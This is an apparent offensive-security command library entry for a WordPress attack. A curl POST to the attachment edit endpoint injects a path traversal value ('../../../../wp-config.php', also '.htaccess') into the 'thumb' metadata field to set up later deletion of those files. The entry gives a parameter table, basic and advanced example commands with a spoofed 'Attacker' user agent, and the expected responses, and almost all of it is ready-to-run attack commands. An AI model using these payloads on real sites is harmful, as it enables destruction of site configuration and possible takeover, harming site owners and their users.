---
id: cmd-curl-update-metadata
data: >-
  curl
  'http://localhost/ripsa/wpvuln/wp-admin/post.php?post=[your_postid]&action=editattachment&_wpnonce=[yournonce]'
  -H 'User-Agent: Mozilla/5.0 (compatible; Attacker/1.0)' -H 'Cookie:
  wordpress_logged_in=valid_session' -d 'thumb=../../../../wp-config.php'
  --compressed
tags:
  - web-exploit
  - post-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:56.510Z'
verified: false
validated: true
submitted: true
---
# curl-update-wordpress-attachment-metadata

## Command

```bash
curl 'http://target.com/wp-admin/post.php?post=123&action=editattachment&_wpnonce=abc123' -H 'User-Agent: Mozilla/5.0 (compatible; Attacker/1.0)' -H 'Cookie: wordpress_logged_in=valid_token' -d 'thumb=../../../../wp-config.php' --compressed
```

## Description

This command sends a POST request to WordPress's attachment edit endpoint to inject a path traversal payload into the 'thumb' metadata field, exploiting lack of sanitization for later file deletion.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `post=[ID]` | Attachment post ID to edit | Yes |
| `action=editattachment` | Triggers the metadata update handler | Yes |
| `_wpnonce=[nonce]` | CSRF token from edit form | Yes |
| `-H 'User-Agent: ...'` | Mimics browser to evade basic checks | Yes |
| `-H 'Cookie: ...'` | Authentication session cookie | Yes |
| `-d 'thumb=...'` | Unsanitized payload for traversal | Yes |
| `--compressed` | Enables gzip compression for request | No |

## Examples

### Basic Usage

```bash
curl 'http://target.com/wp-admin/post.php?post=123&action=editattachment&_wpnonce=abc123' -H 'Cookie: wordpress_logged_in=token' -d 'thumb=../../../../wp-config.php'
```

### Advanced Usage

```bash
curl 'http://target.com/wp-admin/post.php?post=123&action=editattachment&_wpnonce=abc123' -H 'User-Agent: Mozilla/5.0' -H 'Cookie: wordpress_logged_in=token; wp-settings=1' -d 'thumb=../../../../.htaccess' --compressed -v
```

## Expected Output

HTTP 200 OK or 302 redirect to the edit page, with HTML response indicating successful form submission. No explicit error; verify via database or re-edit.

## Related

- [[Related Procedure|procedures/Inject-Path-Traversal-Payload-into-Attachment-Metadata]]
